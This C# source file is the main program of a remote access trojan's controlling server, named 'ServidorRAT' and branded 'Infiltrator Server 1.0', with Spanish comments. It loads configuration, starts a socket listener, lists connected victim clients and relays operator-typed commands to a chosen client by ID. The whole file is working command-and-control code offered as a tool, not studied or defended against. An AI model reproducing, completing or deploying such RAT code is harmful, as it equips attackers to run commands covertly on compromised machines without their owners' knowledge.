using Server.Conexion;
using Server.GUI;
using System;
using System.IO;
using System.Threading;

namespace Server
{
    class ServidorRAT
    {
        static void Main(string[] args)
        {
            // Intentar cargar la configuración del servidor
            try
            {
                Config.LoadConfig();
                Console.WriteLine("[+] Configuración del servidor cargada correctamente.");
                Console.WriteLine($"ServerIP from config: {Config.ServerIP}");

            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] No se pudo cargar la configuración del servidor: {ex.Message}");
                Environment.Exit(1); // Salir si no se puede cargar la configuración
            }

            Thread.Sleep(2000);

            // Iniciar el servidor
            ServerSocket.startServer();

            // Mostrar el menú principal
            Menu.showMenu();

            while (ServerSocket.serverStatus())
            {
                if (!ServerSocket.isWaiting()) // Solo muestra el prompt si no se está esperando una respuesta
                {
                    Console.Write("\n[+] Infiltrator Server 1.0>");
                }

                string input = Console.ReadLine();
                string[] parts = input.Split(new char[] { ' ' }, 2);

                if (parts.Length < 2)
                {
                    if (input.Trim().ToLower() == "help")
                    {
                        Menu.ShowHelp();
                    }
                    else if (input.Trim().ToLower() == "clients")
                    {
                        ServerSocket.ListClients();
                    }
                    else if (input.Trim().ToLower() == "exit")
                    {
                        ServerSocket.stopServer();
                        Console.WriteLine("\n[+] Infiltrator Server 1.0> [INFO] Deteniendo el servidor...");
                        Environment.Exit(0);
                        break;
                    }
                    else
                    {
                        Console.WriteLine("\n[+] Infiltrator Server 1.0> [ERROR] Formato incorrecto. Usa: ID comando");
                    }
                    continue;
                }

                if (int.TryParse(parts[0], out int clientId))
                {
                    string command = parts[1];
                    ServerSocket.SendCommand(clientId, command);
                    ServerSocket.setWaiting(true);
                }
                else
                {
                    Console.WriteLine("\n[+] Infiltrator Server 1.0> [ERROR] No hay ningún cliente conectado con ese ID.");
                }
            }
        }
    }
}